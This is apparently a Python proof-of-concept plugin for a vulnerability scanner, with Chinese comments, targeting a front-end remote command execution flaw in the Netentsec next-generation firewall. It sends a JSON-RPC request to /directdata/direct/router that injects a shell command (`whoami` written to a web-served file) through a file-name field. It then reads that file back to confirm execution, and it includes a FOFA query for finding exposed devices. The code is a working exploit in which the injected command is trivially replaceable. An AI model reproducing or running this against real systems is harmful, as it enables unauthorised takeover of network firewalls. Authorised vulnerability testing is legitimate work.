import pocs
from lib import config
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='网康防火墙前台RCE（任意命令执行漏洞）'
        self.vul_name='网康防火墙前台RCE'
        self.vul_num=''
        self.app_name='网康下一代防火墙（NGFW）'
        self.app_version=''
        self.author='haochen'
        self.msg='fofa查询：app="网康科技-下一代防火墙"'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'}
        self.payload = "/directdata/direct/router"
        data = """{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo `whoami` >/var/www/html/test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}"""
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.post(target,headers=head,verify=False,data=data)
            if response.status_code == 200 and 'true' in response.text:
                re1 = requests.get(url+'/test.txt',headers=head,verify=False,timeout=5)
                if re1.status_code == 200 and re1.text != '':
                # 攻击完成后需要将攻击的结果写入
                    att_msg['status'] = 'success'
                    att_msg['msg'] = '存在网康防火墙前台RCE漏洞'
                else:
                    att_msg['status']='failed'
                    att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                    #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg